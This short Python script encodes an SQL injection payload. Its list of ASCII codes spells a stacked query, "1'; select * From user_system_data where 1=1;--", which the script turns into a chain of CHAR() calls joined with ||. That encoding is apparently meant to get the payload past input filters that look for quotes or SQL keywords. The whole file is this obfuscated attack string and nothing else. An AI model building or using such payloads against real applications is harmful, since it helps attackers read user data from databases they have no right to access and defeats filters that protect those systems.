ascii_values = [49, 39, 59, 32, 115, 101, 108, 101, 99, 116, 32, 42, 32, 70, 114, 111, 109, 32, 117, 115, 101, 114, 95, 115, 121, 115, 116, 101, 109, 95, 100, 97, 116, 97, 32, 119, 104, 101, 114, 101, 32, 49, 61, 49, 59, 45, 45]
name=1
char_string=""
for ascii in ascii_values:

    char_string = char_string+ f'||CHAR({ascii})'

print(char_string[2:])
